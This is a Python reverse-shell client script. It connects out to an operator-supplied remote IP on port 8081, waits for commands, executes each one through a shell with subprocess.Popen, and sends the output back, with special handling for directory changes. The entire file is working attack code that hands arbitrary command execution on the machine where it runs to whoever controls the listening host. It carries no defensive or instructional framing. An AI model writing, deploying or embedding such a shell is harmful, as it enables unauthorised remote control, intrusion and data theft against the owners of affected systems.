import socket
import subprocess
import os

REMOTE_HOST = 'your IP'
REMOTE_PORT = 8081
client = socket.socket()
print("[-] Connection Initiating...")
while 1:
    try:
        client.connect((REMOTE_HOST, REMOTE_PORT))
        break
    except:
        ...
print("[-] Connection initiated!")

current_dir = os.getcwd()

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode().strip()
    print(command)

    if command.startswith("cd"):
        # Handling cd command
        try:
            _, new_dir = command.split(" ", 1)
            os.chdir(new_dir)
            current_dir = os.getcwd()
            client.send(f"Changed directory to: {current_dir}".encode())
        except Exception as e:
            client.send(f"Failed to change directory: {str(e)}".encode())
    else:
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        print("[-] Sending response...")
        print(output)
        if output == b'':
            client.send("8==> Command executed without output or encountered an error.".encode())
        else:
            client.send(output + output_error)
